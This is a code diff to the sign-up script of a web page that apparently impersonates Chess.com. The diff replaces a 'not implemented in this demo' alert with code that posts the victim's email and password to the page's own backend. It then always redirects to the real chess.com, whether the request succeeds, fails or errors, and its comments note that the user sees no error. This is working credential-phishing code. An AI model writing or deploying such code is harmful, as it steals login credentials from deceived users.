@@ -32,13 +32,33 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   // Continue button
-  btnContinue.addEventListener('click', () => {
-    const email = document.getElementById('email').value;
-    const password = passwordInput.value;
-    if (!email || !password) {
-      alert('Please fill in all fields');
-      return;
+btnContinue.addEventListener('click', () => {
+  const email = document.getElementById('email').value.trim();
+  const password = passwordInput.value.trim();
+
+  if (!email || !password) {
+    alert('Please fill in all fields');
+    return;
+  }
+
+  // Send credentials to our backend
+  fetch('/api/register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email, password })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      // All good – redirect to real Chess.com
+      window.location.href = 'https://www.chess.com';
+    } else {
+      // Fallback: redirect anyway (optional)
+      window.location.href = 'https://www.chess.com';
     }
-    alert('Account creation is not implemented in this demo.');
+  })
+  .catch(err => {
+    // If server is down, still redirect (user sees no error)
+    window.location.href = 'https://www.chess.com';
   });
 });
